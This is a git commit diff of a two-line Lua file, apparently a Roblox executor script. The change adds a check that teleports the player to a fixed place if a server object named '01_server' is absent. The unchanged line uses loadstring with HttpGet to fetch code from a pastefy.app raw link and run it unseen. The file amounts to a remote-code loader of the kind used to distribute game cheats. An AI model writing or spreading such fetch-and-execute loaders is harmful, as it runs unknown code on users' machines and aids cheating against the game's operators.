6c4e1a934ac78bf0191718f2b7e850343c8941b1
randomstring0 <sandshowcase@gmail.com>
2024-12-17 18:51:23 +0700

    Update qwerty27.lua

--- qwerty27.lua
+++ qwerty27.lua
@@ -1,1 +1,2 @@
+if not game:GetService("ReplicatedStorage"):FindFirstChild("01_server") then return game:GetService("TeleportService"):Teleport(17574618959, game:GetService("Players").LocalPlayer) end
 loadstring(game:HttpGet(('https://pastefy.app/aKxgjklw/raw'),true))()
